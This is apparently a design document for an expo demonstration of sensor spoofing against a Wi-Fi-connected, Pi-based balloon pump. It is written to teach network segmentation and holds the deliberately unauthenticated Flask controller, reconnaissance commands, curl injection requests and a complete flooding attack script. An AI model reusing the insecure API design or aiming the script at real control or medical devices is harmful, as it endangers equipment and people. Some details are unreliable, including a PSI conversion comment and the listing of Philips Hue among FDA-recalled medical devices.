# Balloon Demo - Wireless Attack Architecture (Option B)

**Last Updated:** 2026-02-06
**Purpose:** Complete data flow documentation for WiFi-based sensor spoofing attack

---

## PHYSICAL SETUP - EXPO TABLE LAYOUT

```
EXPO TABLE LAYOUT:
┌─────────────────────────────────────────────────────────────────────┐
│                                                                       │
│  [VULNERABLE SYSTEM - LEFT SIDE]        [SECURE SYSTEM - RIGHT SIDE]│
│                                                                       │
│  ┌──────────────────┐                   ┌──────────────────┐        │
│  │ Balloon #1       │                   │ Balloon #2       │        │
│  │ (inflating)      │                   │ (inflating)      │        │
│  └────────┬─────────┘                   └────────┬─────────┘        │
│           │ Air tube                             │ Air tube         │
│           ↓                                      ↓                   │
│  ┌──────────────────┐                   ┌──────────────────┐        │
│  │ Relay HAT        │                   │ Relay HAT        │        │
│  │ (pump/valve)     │                   │ (pump/valve)     │        │
│  └────────┬─────────┘                   └────────┬─────────┘        │
│           │                                      │                   │
│  ┌────────┴─────────┐                   ┌───────┴──────────┐        │
│  │ Pi #7            │                   │ Pi #6            │        │
│  │ 192.168.50.100   │  WiFi             │ 10.30.0.25       │ Ether │
│  │ (VLAN2)          │◄─────┐            │ (VLAN30)         │───────┤
│  └──────────────────┘      │            └──────────────────┘       │
│           ↑                 │                     ↑                  │
│           │ I²C wires       │                     │ I²C wires        │
│           │                 │                     │                  │
│  ┌────────┴─────────┐      │            ┌────────┴─────────┐       │
│  │ Mason Jar        │      │            │ Mason Jar        │       │
│  │ Pressure Chamber │      │            │ Pressure Chamber │       │
│  │ [BMP388 inside]  │      │            │ [BMP388 inside]  │       │
│  └──────────────────┘      │            └──────────────────┘       │
│                             │                                        │
│                    ┌────────┴────────┐                              │
│                    │ TP-Link AC1300  │                              │
│                    │ Access Point    │                              │
│                    │ "Medical-IoT"   │                              │
│                    │ SSID (VLAN2)    │                              │
│                    └────────┬────────┘                              │
│                             │ Ethernet                               │
│                             │ (to UDM-SE)                           │
│  ┌──────────────────────────┴──────────────────────┐               │
│  │ Attacker Laptop (on same WiFi network)          │               │
│  │ "Medical-IoT" SSID - 192.168.50.x               │               │
│  │ [Wireshark running] [attack_spoof.py running]   │               │
│  └──────────────────────────────────────────────────┘               │
│                                                                       │
└─────────────────────────────────────────────────────────────────────┘
```

---

## NETWORK CONFIGURATION

### Vulnerable System (Pi #7)
- **IP Address:** 192.168.50.100 (DHCP or static)
- **Network:** VLAN2 (192.168.50.0/24)
- **Connection:** WiFi via TP-Link AC1300
- **SSID:** "Medical-IoT" (or "Hospital-Medical-Devices")
- **Gateway:** 192.168.50.1
- **Usernames:**
  - `username` (for balloon control services)
  - `vulnerable` (optional - for attack demonstrations)

### Secure System (Pi #6)
- **IP Address:** 10.30.0.25 (static)
- **Network:** VLAN30 (10.30.0.0/24)
- **Connection:** Wired Ethernet
- **Gateway:** 10.30.0.1
- **Username:** `username`

### TP-Link AC1300 Access Point
- **Mode:** Access Point (NOT router mode)
- **VLAN:** 2 (192.168.50.0/24)
- **Switch Port:** Port 15 on UDM-SE
- **SSID:** "Medical-IoT"
- **Security:** WPA2-PSK
- **Password:** (Set weak password for demo realism)
- **Band:** 5GHz preferred (less interference in expo hall)

### Attacker Laptop
- **Connection:** WiFi to "Medical-IoT" SSID
- **IP:** 192.168.50.x (DHCP assigned)
- **Tools:** Wireshark, nmap, Python 3, curl

---

## PHASE 1: NORMAL OPERATION (No Attack)

### Step 1: Physical Pressure Measurement

```
Balloon inflating → Air pressure 1.5 PSI
    ↓
Air tube → Brass tee junction
    ↓
Side port → 6" tube → Mason jar pressure chamber
    ↓
BMP388 sensor inside jar measures ambient air pressure
    - Sensor reads: 110,325 Pascals (atmospheric + balloon pressure)
    - Internal calculation: 110,325 Pa = 16.0 PSI absolute
    - Relative pressure: 16.0 - 14.7 = 1.3 PSI gauge pressure
```

### Step 2: I²C Communication (Physical Wires)

```
BMP388 Sensor → I²C Protocol → Raspberry Pi #7 GPIO Pins

    Wire 1: VIN (3.3V power) ──→ Pin 1 (3.3V)
    Wire 2: GND (ground)     ──→ Pin 6 (GND)
    Wire 3: SCL (I²C clock)  ──→ Pin 5 (GPIO 3)
    Wire 4: SDA (I²C data)   ──→ Pin 3 (GPIO 2)

Python code:
    import board
    import adafruit_bmp3xx

    i2c = board.I2C()
    bmp = adafruit_bmp3xx.BMP3XX_I2C(i2c, address=0x77)
    pressure_pa = bmp.pressure  # Returns: 110325 Pa
    pressure_psi = pressure_pa / 6894.76  # Converts to: 1.3 PSI
```

### Step 3: Sensor Publisher Process (sensor_publisher.py)

**Location:** `/home/username/balloon-demo/scripts/sensor_publisher.py`
**Systemd Service:** `balloon-sensor-publisher.service`

```python
def main():
    while True:
        # Read sensor via I²C
        pressure_pa = bmp.pressure
        pressure_psi = pressure_pa / 6894.76
        temp_c = bmp.temperature

        # Create sensor data packet
        sensor_data = {
            "pressure": round(pressure_psi, 4),  # 1.3000 PSI
            "temperature": round(temp_c, 2),     # 22.5°C
            "timestamp": datetime.now().isoformat(),
            "source": "bmp388-vulnerable",
            "sensor_id": "BMP388-SENSOR-001"
        }

        # Publish via HTTP to control API
        response = requests.post(
            "http://localhost:5000/sensor",
            json=sensor_data,
            timeout=2
        )

        print(f"Published: {pressure_psi} PSI")
        time.sleep(1)  # Publish every 1 second
```

**Key Point:** Publishes to `localhost:5000`, but Flask API listens on `0.0.0.0:5000` (all interfaces), making it accessible from WiFi!

### Step 4: HTTP Communication Over WiFi (VULNERABLE!)

```
HTTP POST Request:

    POST http://localhost:5000/sensor HTTP/1.1
    Host: localhost:5000
    Content-Type: application/json
    Content-Length: 156

    {
        "pressure": 1.3000,
        "temperature": 22.5,
        "timestamp": "2026-02-06T15:30:45Z",
        "source": "bmp388-vulnerable",
        "sensor_id": "BMP388-SENSOR-001"
    }
```

⚠️ **CRITICAL VULNERABILITY:** Flask API listens on `0.0.0.0:5000`, making it accessible from ANY device on the WiFi network!

### Step 5: Control API Process (balloon_control_api.py)

**Location:** `/home/username/balloon-demo/scripts/balloon_control_api.py`
**Systemd Service:** `balloon-control-api.service`
**Status:** ✅ RUNNING on http://192.168.50.100:5000

```python
from flask import Flask, request, jsonify
import lib8relind
import time
import threading

app = Flask(__name__)
current_pressure = 0.0  # Global variable (vulnerable!)

TARGET_PRESSURE = 2.5   # PSI
MAX_SAFE_PRESSURE = 3.5 # PSI
RELAY_PUMP = 1
RELAY_VALVE = 2

@app.route('/sensor', methods=['POST'])
def update_sensor():
    """
    ⚠️ CRITICAL VULNERABILITY: Accept sensor data from ANYONE
    No authentication! No source validation! No encryption!
    """
    global current_pressure

    data = request.json

    # NO AUTH CHECK - Just trust whoever sends data!
    current_pressure = data.get('pressure', current_pressure)

    print(f"Received pressure: {current_pressure} PSI from {request.remote_addr}")

    return jsonify({
        "status": "accepted",
        "pressure": current_pressure
    }), 200

@app.route('/status', methods=['GET'])
def get_status():
    """
    Public status endpoint - no auth required
    """
    return jsonify({
        "status": "running",
        "current_pressure": current_pressure,
        "pump_state": "ON" if lib8relind.get(0, RELAY_PUMP) else "OFF",
        "valve_state": "OPEN" if lib8relind.get(0, RELAY_VALVE) else "CLOSED",
        "uptime": time.time() - start_time
    }), 200

def control_loop():
    """
    Control loop runs in separate thread
    Makes decisions based on current_pressure global variable
    """
    while True:
        if current_pressure >= MAX_SAFE_PRESSURE:
            # Emergency shutoff!
            lib8relind.set(0, RELAY_PUMP, 0)   # Pump OFF
            lib8relind.set(0, RELAY_VALVE, 0)  # Valve CLOSED
            buzzer_on()
            print(f"⚠️ EMERGENCY: Pressure {current_pressure} PSI - SHUTOFF!")

        elif current_pressure >= TARGET_PRESSURE:
            # Target reached
            lib8relind.set(0, RELAY_PUMP, 0)   # Pump OFF
            lib8relind.set(0, RELAY_VALVE, 0)  # Valve CLOSED
            print(f"✓ Target reached: {current_pressure} PSI")

        elif current_pressure < TARGET_PRESSURE:
            # Below target - inflate!
            lib8relind.set(0, RELAY_VALVE, 1)  # Valve OPEN
            time.sleep(0.5)
            lib8relind.set(0, RELAY_PUMP, 1)   # Pump ON
            print(f"↑ Inflating: {current_pressure} PSI (target: {TARGET_PRESSURE})")

        time.sleep(0.2)  # Check 5 times per second

if __name__ == '__main__':
    # Start control loop in background thread
    threading.Thread(target=control_loop, daemon=True).start()

    # Start Flask API on ALL interfaces (0.0.0.0 = accessible from WiFi!)
    app.run(host='0.0.0.0', port=5000)  # ⚠️ VULNERABILITY!
```

### Step 6: Relay Control (Physical Hardware)

```
Sequent 8-RELAYS HAT receives commands via I²C:

    Relay 1 (Pump):  ON  → 12V DC air pump inflating balloon
    Relay 2 (Valve): OPEN → Solenoid valve allows air flow

    Air path: Pump → Valve → Tee → Balloon (+ pressure chamber)

    Balloon inflates to 1.3 PSI... 1.5 PSI... 1.8 PSI...
    Control loop monitoring: "Still below 2.5 PSI target, keep inflating"
```

**Normal Operation Summary:**
- ✅ Sensor reads REAL pressure via I²C
- ✅ Publisher sends data via HTTP every 1 second
- ✅ Control API accepts data and controls relays
- ✅ Balloon inflates safely until 2.5 PSI target
- ✅ System shuts off pump automatically at target

---

## PHASE 2: RECONNAISSANCE - ATTACKER JOINS WIFI

### Attack Step 1: WiFi Network Discovery

```bash
# Attacker in parking lot runs WiFi scan
$ sudo iwlist wlan0 scan | grep SSID

ESSID:"HospitalGuest"
ESSID:"Medical-IoT"          ← Target network!
ESSID:"Hospital-Staff"
ESSID:"Patient-WiFi"

# Attacker connects to "Medical-IoT" network
$ sudo nmcli dev wifi connect "Medical-IoT" password "weakpassword123"

Connected! IP assigned: 192.168.50.150 (DHCP)
Gateway: 192.168.50.1
Network: 192.168.50.0/24
```

### Attack Step 2: Network Reconnaissance

```bash
# Scan for devices on network
$ nmap -sn 192.168.50.0/24

Starting Nmap scan...
Host is up: 192.168.50.1 (Gateway - UDM-SE)
Host is up: 192.168.50.100 (Raspberry Pi - balloon-vulnerable)
Host is up: 192.168.50.150 (Our laptop)

# Scan Pi for open ports
$ nmap -sV 192.168.50.100

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2
5000/tcp open  http     Werkzeug/2.0.3 Python/3.9.2   ← Flask API!

Device type: general purpose
Running: Linux 5.10
OS: Raspberry Pi OS
```

### Attack Step 3: API Endpoint Discovery

```bash
# Test if Flask is running
$ curl http://192.168.50.100:5000/

Response: 404 Not Found (Flask is running!)

# Try common endpoint
$ curl http://192.168.50.100:5000/status

Response 200 OK:
{
    "status": "running",
    "current_pressure": 1.5,
    "pump_state": "ON",
    "valve_state": "OPEN",
    "uptime": 3600
}

← Attacker discovers API endpoint!

# Test sensor endpoint
$ curl -X POST http://192.168.50.100:5000/sensor \
       -H "Content-Type: application/json" \
       -d '{"pressure": 9.99, "source": "test"}'

Response 200 OK:
{
    "status": "accepted",
    "pressure": 9.99
}

🚨 SUCCESS! Attacker discovered:
   1. API accepts POST requests to /sensor
   2. No authentication required!
   3. No API key needed!
   4. System accepts ANY pressure value!
   5. System responds with "accepted" confirmation!

# Verify spoofed data was accepted
$ curl http://192.168.50.100:5000/status

Response:
{
    "current_pressure": 9.99,   ← Our spoofed value!
    "pump_state": "OFF",        ← System believes 9.99 PSI!
    "valve_state": "CLOSED"
}
```

---

## PHASE 3: EXPLOITATION - SENSOR SPOOFING ATTACK

### Timing Attack: Legitimate Sensor vs Attacker

```
Legitimate sensor_publisher.py:
    - Publishes every 1.0 seconds (1 Hz)
    - Sends REAL pressure: 2.8 PSI (balloon currently over-inflated!)

Attacker's attack_spoof.py:
    - Publishes every 0.1 seconds (10 Hz)
    - Sends FAKE pressure: 0.0 PSI (balloon "empty")

Race condition timeline:

Time (sec) | Legitimate Sensor | Attacker      | System Believes
-----------|-------------------|---------------|------------------
0.0        | POST: 2.8 PSI     |               | 2.8 PSI (REAL)
0.1        |                   | POST: 0.0 PSI | 0.0 PSI (FAKE!)
0.2        |                   | POST: 0.0 PSI | 0.0 PSI (FAKE!)
0.3        |                   | POST: 0.0 PSI | 0.0 PSI (FAKE!)
0.4        |                   | POST: 0.0 PSI | 0.0 PSI (FAKE!)
0.5        |                   | POST: 0.0 PSI | 0.0 PSI (FAKE!)
0.6        |                   | POST: 0.0 PSI | 0.0 PSI (FAKE!)
0.7        |                   | POST: 0.0 PSI | 0.0 PSI (FAKE!)
0.8        |                   | POST: 0.0 PSI | 0.0 PSI (FAKE!)
0.9        |                   | POST: 0.0 PSI | 0.0 PSI (FAKE!)
1.0        | POST: 2.9 PSI     |               | 2.9 PSI (REAL)
1.1        |                   | POST: 0.0 PSI | 0.0 PSI (FAKE!)

Result: Attacker's data wins 90% of the time (10 out of 11 updates)!
```

### Attack Script - attack_spoof.py

**Location:** `/home/username/balloon-demo/scripts/attack_spoof.py`

```python
#!/usr/bin/env python3
"""
Sensor Spoofing Attack - Balloon Demo
Floods vulnerable Pi with fake pressure readings
"""

import requests
import time
import sys

TARGET_IP = "192.168.50.100"
TARGET_PORT = 5000
FAKE_PRESSURE = 0.0  # Spoof "empty balloon"
ATTACK_RATE = 0.1    # 10 updates/second (vs legitimate 1/second)

def attack_continuous():
    """
    Continuously flood the vulnerable system with fake sensor data
    """
    url = f"http://{TARGET_IP}:{TARGET_PORT}/sensor"

    print(f"🚨 ATTACK STARTED - Spoofing pressure to {FAKE_PRESSURE} PSI")
    print(f"📡 Target: {url}")
    print(f"⚡ Rate: {1/ATTACK_RATE} updates/second")
    print()

    attack_count = 0

    while True:
        try:
            # Create fake sensor data packet
            fake_data = {
                "pressure": FAKE_PRESSURE,
                "temperature": 25.0,
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
                "source": "attacker-laptop",
                "sensor_id": "SPOOFED-DATA"
            }

            # Send spoofed data
            response = requests.post(url, json=fake_data, timeout=1)

            attack_count += 1

            if response.status_code == 200:
                print(f"✅ Attack #{attack_count}: Spoofed data ACCEPTED", end='\r')
            else:
                print(f"❌ Attack #{attack_count}: REJECTED ({response.status_code})")

            time.sleep(ATTACK_RATE)

        except requests.exceptions.ConnectionError:
            print("\n⚠️  Connection lost to target")
            time.sleep(1)
        except requests.exceptions.Timeout:
            print("\n⚠️  Request timeout")
        except KeyboardInterrupt:
            print(f"\n\n🛑 Attack stopped after {attack_count} spoofed packets")
            sys.exit(0)

if __name__ == "__main__":
    print("="*60)
    print(" SENSOR SPOOFING ATTACK - BALLOON DEMO")
    print("="*60)
    attack_continuous()
```

### Attack Result

```
What Happens:

1. Balloon is inflating normally (real pressure: 1.5 PSI)
2. Attacker starts flooding API with fake "0.0 PSI" readings
3. Control system believes pressure is 0.0 PSI
4. Control loop logic:
   - "Pressure 0.0 PSI < target 2.5 PSI"
   - "Action: KEEP PUMP RUNNING"
5. Real pressure continues rising: 2.0... 2.5... 3.0... 3.5... 4.0 PSI
6. System still believes: "0.0 PSI - need more air!"
7. Balloon POPS at ~4.5 PSI 💥

In a real hospital:
- IV pump over-doses patient
- Ventilator over-pressures lungs
- Insulin pump delivers fatal dose
- HVAC system overheats operating room
```

---

## COMPARISON: VULNERABLE VS SECURE ARCHITECTURE

### Side-by-Side Data Flow

```
VULNERABLE SYSTEM (Pi #7)          |  SECURE SYSTEM (Pi #6)
-----------------------------------+----------------------------------
BMP388 Sensor                      |  BMP388 Sensor
    ↓ I²C                          |      ↓ I²C
sensor_publisher.py                |  balloon_control_secure.py
    ↓ HTTP POST (localhost)        |      ↓ (same process)
balloon_control_api.py             |  [Input validation]
    ↓ (Flask on 0.0.0.0:5000)      |      ↓
    ↓ EXPOSED TO WIFI! ⚠️          |  [Anomaly detection]
Attacker can POST fake data        |      ↓
    ↓                              |  [Relay control]
Uses spoofed pressure              |      ↓
    ↓                              |  [Log to Wazuh SIEM]
Balloon POPS 💥                    |      ↓
                                   |  Balloon safely inflates ✅
                                   |      ↓
                                   |  Firewall blocks attacker
                                   |      ↓
                                   |  Wazuh logs attack attempt
```

### Security Comparison Table

| Feature | Vulnerable (Pi #7) | Secure (Pi #6) |
|---------|-------------------|----------------|
| **Network** | WiFi (VLAN2) | Wired (VLAN30) |
| **Sensor Connection** | I²C → HTTP API | Direct I²C only |
| **API Endpoint** | Flask on 0.0.0.0:5000 | No API |
| **Authentication** | None | N/A (no network access) |
| **Firewall Protection** | None (same VLAN as attacker) | VLAN30 isolated from VLAN2 |
| **SIEM Logging** | None | Wazuh (all actions logged) |
| **Input Validation** | None (trusts all data) | Validates range, rate of change |
| **Anomaly Detection** | None | Detects rapid pressure changes |
| **Attack Surface** | WiFi network + HTTP API | None (airgapped sensor) |
| **Real-World Analog** | Wireless IoT medical device | Hardened critical infrastructure |

---

## FIREWALL RULES FOR THIS ARCHITECTURE

### UDM-SE Firewall Configuration

```
┌─────────────────────────────────────────────────────────────────────┐
│ Rule 1: ALLOW VLAN30 → VLAN2 (Admin Access)                        │
├─────────────────────────────────────────────────────────────────────┤
│ Name: ALLOW_VLAN30_TO_VLAN2                                         │
│ Type: LAN In                                                         │
│ Action: Accept                                                       │
│                                                                      │
│ Source:                                                              │
│   Type: Network                                                      │
│   Network: VLAN30 (10.30.0.0/24)                                    │
│                                                                      │
│ Destination:                                                         │
│   Type: Network                                                      │
│   Network: VLAN2 (192.168.50.0/24)                                  │
│                                                                      │
│ Protocol: All                                                        │
│ Logging: Disabled (normal admin traffic)                            │
│                                                                      │
│ Purpose: Allows you to manage/monitor vulnerable Pi from VLAN30    │
└─────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────┐
│ Rule 2: BLOCK VLAN2 → VLAN30 (Prevent Lateral Movement)            │
├─────────────────────────────────────────────────────────────────────┤
│ Name: BLOCK_VLAN2_TO_VLAN30                                         │
│ Type: LAN In                                                         │
│ Action: Drop                                                         │
│                                                                      │
│ Source:                                                              │
│   Type: Network                                                      │
│   Network: VLAN2 (192.168.50.0/24)                                  │
│                                                                      │
│ Destination:                                                         │
│   Type: Network                                                      │
│   Network: VLAN30 (10.30.0.0/24)                                    │
│                                                                      │
│ Protocol: All                                                        │
│ Logging: ✅ ENABLED (log all blocked attempts)                      │
│                                                                      │
│ Purpose: If vulnerable Pi is compromised, attacker cannot reach:    │
│   - Wazuh SIEM (10.30.0.55)                                         │
│   - MQTT Broker (10.30.0.51)                                        │
│   - PostgreSQL (10.30.0.52)                                         │
│   - Secure Pi #6 (10.30.0.25)                                       │
│   - All other infrastructure                                        │
└─────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────┐
│ Rule 3: ALLOW VLAN2 → Internet (Optional - for demo)               │
├─────────────────────────────────────────────────────────────────────┤
│ Name: ALLOW_VLAN2_TO_WAN                                            │
│ Type: LAN In                                                         │
│ Action: Accept                                                       │
│                                                                      │
│ Source:                                                              │
│   Type: Network                                                      │
│   Network: VLAN2 (192.168.50.0/24)                                  │
│                                                                      │
│ Destination:                                                         │
│   Type: Any (WAN)                                                    │
│                                                                      │
│ Protocol: All                                                        │
│ Logging: Disabled                                                    │
│                                                                      │
│ Purpose: Allows vulnerable Pi to download updates, but attacker     │
│          can also exfiltrate data - makes demo more realistic       │
└─────────────────────────────────────────────────────────────────────┘

⚠️ CRITICAL: Rules must be in this order! First match wins.
```

---

## EXPO PRESENTATION SCRIPT

### Opening Statement (30 seconds)

*"Today we're demonstrating a critical vulnerability in IoT medical devices connected to hospital networks. On the left, you see a VULNERABLE system that represents how many real medical devices operate today. On the right is a SECURE system following cybersecurity best practices."*

### The Vulnerable System - Left Side (1 minute)

*"This pressure sensor controls a balloon inflation system - imagine this is an IV pump, ventilator, or insulin pump. The sensor is connected wirelessly to the hospital's medical device WiFi network. It publishes pressure readings via an HTTP API every second. The control system uses these readings to make safety decisions."*

*"The problem? There's NO authentication on the sensor API. Anyone on the same WiFi network can send fake data."*

### The Attack Demonstration (2-3 minutes)

*"I'm now connecting to the same WiFi network as an attacker - maybe I'm sitting in the parking lot with a laptop. Using simple network scanning tools, I can discover the device and its API..."*

```bash
[Show terminal 1: nmap scan]
$ nmap -sV 192.168.50.100
PORT     STATE SERVICE  VERSION
5000/tcp open  http     Werkzeug (Flask)

[Show terminal 2: API test]
$ curl http://192.168.50.100:5000/status
{"current_pressure": 1.5, "pump_state": "ON"}

[Show terminal 3: Start attack]
$ python3 attack_spoof.py
🚨 ATTACK STARTED - Spoofing pressure to 0.0 PSI
✅ Attack #1: Spoofed data ACCEPTED
✅ Attack #2: Spoofed data ACCEPTED
✅ Attack #3: Spoofed data ACCEPTED
...
```

*"Watch what happens when I flood the system with fake readings saying the balloon is empty..."*

*[Point to vulnerable balloon - keeps inflating beyond safe pressure]*

*"The system believed my fake data instead of the real sensor. It kept inflating even though the actual pressure was dangerously high..."*

*[Balloon pops] 💥*

*"In a hospital, this could kill a patient."*

### The Secure System - Right Side (1 minute)

*"Now look at the secure system. It reads the sensor DIRECTLY via I²C - the data never touches the network. The firewall blocks all traffic from the vulnerable VLAN to the secure VLAN. Even if an attacker compromises the vulnerable device, they cannot reach ANY other hospital systems. And all actions are logged to our Wazuh SIEM for security monitoring."*

*[Show attempt to attack secure system]*

```bash
$ python3 attack_spoof.py --target 10.30.0.25
❌ Connection refused (no API endpoint)
❌ No route to host (firewall blocked)
```

*"The attack completely fails. The balloon inflates safely to the target pressure and stops. This is defense in depth - multiple layers of security working together."*

### Key Takeaways (30 seconds)

*"The lessons from this demonstration:"*

1. **Network segmentation** (VLANs + firewall) prevents lateral movement
2. **Minimize attack surface** (no unnecessary network APIs)
3. **SIEM monitoring** (Wazuh) detects and logs security events
4. **Defense in depth** (multiple security layers, not just one)

*"These principles apply to ANY IoT deployment - from hospitals to factories to smart homes."*

---

## SETUP INSTRUCTIONS

### Prerequisites

- TP-Link AC1300 access point
- UDM-SE with VLAN2 configured
- Pi #7 with WiFi capability
- Attacker laptop with WiFi

### Step 1: Configure TP-Link AC1300

1. Connect AC1300 to laptop via Ethernet
2. Access web interface: http://192.168.0.1
3. Set to **Access Point mode** (not router)
4. Configure wireless:
   - **SSID:** "Medical-IoT"
   - **Security:** WPA2-PSK
   - **Password:** weakpassword123 (or similar)
   - **Band:** 5GHz preferred
   - **Channel:** Auto
5. Disable DHCP (UDM-SE will handle it)
6. Save and reboot

### Step 2: Connect AC1300 to UDM-SE

1. Connect AC1300 Ethernet to UDM-SE port 15
2. Configure port 15 in UDM-SE:
   - Port Profile: All (or custom with VLAN2 untagged)
   - VLAN: 2 (untagged)
3. Verify AC1300 gets IP from VLAN2 DHCP

### Step 3: Configure Pi #7 WiFi

1. SSH to Pi #7 via Ethernet (while still connected)

```bash
ssh username@192.168.50.100

# Edit WiFi config
sudo nano /etc/wpa_supplicant/wpa_supplicant.conf

# Add network:
network={
    ssid="Medical-IoT"
    psk="weakpassword123"
    priority=10
}

# Save and reboot
sudo reboot
```

2. Disconnect Ethernet cable
3. Verify Pi #7 connects via WiFi and gets same IP (192.168.50.100)

### Step 4: Create Firewall Rules

1. Go to UDM-SE: **Settings** → **Security** → **Traffic & Security** → **Firewall Rules**
2. Create **ALLOW_VLAN30_TO_VLAN2** (Rule 1 above)
3. Create **BLOCK_VLAN2_TO_VLAN30** (Rule 2 above)
4. Verify rule order (ALLOW first, BLOCK second)

### Step 5: Test Attack

1. Connect attacker laptop to "Medical-IoT" WiFi
2. Run reconnaissance:

```bash
nmap -sn 192.168.50.0/24
nmap -sV 192.168.50.100
curl http://192.168.50.100:5000/status
```

3. Run attack script:

```bash
cd /home/username/balloon-demo/scripts
python3 attack_spoof.py
```

4. Verify vulnerable balloon over-inflates
5. Verify secure balloon operates normally
6. Verify firewall blocks VLAN2 → VLAN30 traffic

---

## TROUBLESHOOTING

### Pi #7 won't connect to WiFi

```bash
# Check WiFi config
sudo cat /etc/wpa_supplicant/wpa_supplicant.conf

# Check WiFi interface
iwconfig

# Scan for networks
sudo iwlist wlan0 scan | grep "Medical-IoT"

# Check systemd WiFi service
sudo systemctl status wpa_supplicant

# Manual reconnect
sudo wpa_cli reconfigure
```

### Attack script can't reach API

```bash
# Verify attacker laptop is on VLAN2
ip addr show wlan0  # Should show 192.168.50.x

# Verify Pi #7 reachable
ping 192.168.50.100

# Verify Flask API running
curl http://192.168.50.100:5000/status

# Check firewall rules aren't blocking
sudo iptables -L -n -v
```

### Firewall not blocking lateral movement

```bash
# From Pi #7, try to reach VLAN30
ssh username@192.168.50.100
ping 10.30.0.1  # Should timeout

# Check UDM-SE firewall logs
# Go to Settings → System → Logs → Firewall
# Filter by Source: 192.168.50.0/24
# Should see DROP events
```

---

## REAL-WORLD PARALLELS

This demonstration mirrors actual vulnerabilities:

1. **FDA-Recalled Medical Devices:**
   - Hospira Symbiq Infusion Pump (2015) - Unauthenticated wireless commands
   - Medtronic CareLink (2019) - Unencrypted telemetry data
   - Philips Hue Smart Lights (2020) - Zigbee command injection

2. **Stuxnet (2010):**
   - Manipulated PLCs controlling centrifuges
   - Falsified sensor data to hide damage
   - Operators saw normal readings while system destroyed itself

3. **Hospital Ransomware (2020-2024):**
   - IoT devices as entry point
   - Lateral movement to EHR systems
   - Patient care disruption

4. **ICS/SCADA Attacks:**
   - Colonial Pipeline (2021)
   - Water treatment facility (2021)
   - Power grid attempts (ongoing)

**Key Point:** This is not theoretical - these attacks happen in the real world!

---

## FILES AND SCRIPTS

### Python Scripts

- `/home/username/balloon-demo/scripts/sensor_publisher.py` - Vulnerable sensor publisher
- `/home/username/balloon-demo/scripts/balloon_control_api.py` - Vulnerable Flask API
- `/home/username/balloon-demo/scripts/attack_spoof.py` - Attack demonstration script
- `/home/username/balloon-demo/scripts/balloon_control_secure.py` - Secure control system
- `/home/username/balloon-demo/scripts/test_bmp388.py` - Sensor diagnostic
- `/home/username/balloon-demo/scripts/test_relays.py` - Relay diagnostic

### Systemd Services

- `/etc/systemd/system/balloon-sensor-publisher.service` - Sensor publisher service
- `/etc/systemd/system/balloon-control-api.service` - Flask API service (RUNNING)
- `/etc/systemd/system/balloon-control-secure.service` - Secure control service

### Documentation

- `BALLOON_DEMO_DESIGN_NOTES.md` - Architecture and design decisions
- `DEPLOYMENT_NOTES_2026-02-05.md` - Deployment history and troubleshooting
- `WIRELESS_ATTACK_ARCHITECTURE.md` - This document
- `ACTION_ITEMS_2026-02-05.md` - Task tracking

---

**Document Created:** 2026-02-06
**Status:** Complete - Ready for TP-Link AC1300 configuration
